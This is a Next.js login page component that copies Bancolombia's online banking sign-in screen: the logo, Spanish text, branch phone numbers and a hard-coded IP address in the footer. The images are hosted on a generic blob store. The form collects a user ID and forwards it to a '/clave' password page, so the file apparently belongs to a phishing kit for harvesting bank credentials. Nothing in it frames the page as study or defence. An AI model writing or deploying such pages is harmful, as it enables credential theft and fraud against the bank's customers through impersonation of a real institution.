'use client';

import Image from 'next/image'
import Link from 'next/link'
import { useState, useEffect } from 'react'
import { Open_Sans } from 'next/font/google'
import { useRouter } from 'next/navigation';
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { User } from "lucide-react"

const openSans = Open_Sans({ subsets: ['latin'] })

export default function Component() {
  const [username, setUsername] = useState('');
  const [error, setError] = useState('');
  const router = useRouter();
  const [currentDateTime, setCurrentDateTime] = useState('')

  useEffect(() => {
    setCurrentDateTime(new Date().toLocaleString())
    const timer = setInterval(() => {
      setCurrentDateTime(new Date().toLocaleString())
    }, 1000)
    return () => clearInterval(timer)
  }, [])

  const handleChange = (e) => {
    const value = e.target.value.replace(/[^0-9]/g, '');
    setUsername(value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    if (!username) {
      setError('Por favor, ingresa tu usuario.');
      return;
    }
    // Redirige a la página /clave
    router.push(`/clave?usuario=${encodeURIComponent(username)}`);
  };

  return (
    <div className={`min-h-screen flex flex-col bg-white ${openSans.className}`}>
      <header className="bg-background p-4 border-b border-border">
        <div className="max-w-7xl mx-auto">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/bancolombia-logo-5oInibfRwiiIdn8tSNawti11zRcDMj.png"
            alt="Bancolombia Logo"
            width={170}
            height={27}
            className="h-[27px] w-auto"
          />
          <p className="text-[1.08rem] text-muted-foreground mt-1">Sucursal Virtual Personas</p>
          <p className="text-xs text-muted-foreground mt-1">Fecha y hora actual: {currentDateTime}</p>
        </div>
      </header>

      <main className="flex-grow flex items-start justify-center px-4 sm:px-6 lg:px-8 pt-8">
        <div className="max-w-4xl w-full space-y-8">
          <div className="text-left bg-black py-[1.824px] px-3.2">
            <h1 className="text-lg font-semibold text-white pl-[15px]">Inicio de sesión</h1>
          </div>
          <div className="flex flex-col md:flex-row md:space-x-8 space-y-8 md:space-y-0">
            <div className="w-full max-w-md">
              <Card>
                <CardHeader className="bg-black text-white py-[0.85em]">
                  <CardTitle className="text-[1.03em]">Usuario</CardTitle>
                </CardHeader>
                <div className="bg-muted px-6 py-2 text-sm text-muted-foreground">
                  Si no tienes un usuario asignado ingresa con tu documento de identidad
                </div>
                <CardContent className="pt-6">
                  <form className="space-y-6" onSubmit={handleSubmit}>
                    <div>
                      <label htmlFor="username" className="flex items-center text-sm font-medium mb-1">
                        <User className="w-3 h-3 mr-2" />
                        Ingresa tu usuario
                      </label>
                      <div className="relative">
                        <Input
                          id="username"
                          name="username"
                          type="number"
                          value={username}
                          onChange={handleChange}
                          required
                          className="pl-8 rounded-none"
                          placeholder=""
                          aria-label="Nombre de usuario"
                        />
                        <User className="absolute left-2 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      </div>
                      {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
                    </div>
                    <div className="flex justify-center">
                      <Button type="submit" className="w-1/2 bg-yellow-400 hover:bg-yellow-500 text-gray-700 rounded-none">
                        Continuar
                      </Button>
                    </div>
                  </form>
                  <div className="mt-4 text-right">
                    <Link href="#" className="text-sm text-muted-foreground hover:underline">
                      ¿Olvidaste tu usuario?
                    </Link>
                  </div>
                  <div className="mt-2 text-right">
                    <Link href="#" className="text-sm text-muted-foreground hover:underline">
                      ¿Problemas para conectarte?
                    </Link>
                  </div>
                </CardContent>
              </Card>
              <Card className="mt-8">
                <CardContent className="p-0">
                  <Image
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/iconos-2-sip0ndFTnPrd0UQjqNTsKAFfKTq09O.jpg"
                    alt="Información adicional sobre servicios bancarios"
                    width={360}
                    height={180}
                    layout="responsive"
                  />
                </CardContent>
              </Card>
            </div>
            <div className="w-full max-w-md">
              <div className="w-full relative aspect-[16/9]">
                <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/12110e566a318__cuentas-A0KhC12s0G4efxmnoj4ZnynqqPPeIC.png"
                  alt="Dos personas sonrientes mirando una pantalla"
                  layout="fill"
                  objectFit="cover"
                  className="rounded-lg"
                />
              </div>
              <p className="text-sm text-center text-muted-foreground">
                ¿No conoces la Sucursal Virtual Personas de Bancolombia? Conoce más{" "}
                <Link href="#" className="text-blue-600 hover:underline">
                  aquí
                </Link>
              </p>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-background p-4 text-center text-xs text-muted-foreground border-t border-border" role="contentinfo">
        <p>
          Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 - Cali (57) 60 2
          554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00
        </p>
        <p>Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14</p>
        <p>Dirección IP: 181.143.198.86</p>
        <p>Copyright ©️ 2024 Bancolombia S.A.</p>
      </footer>
    </div>
  )
}
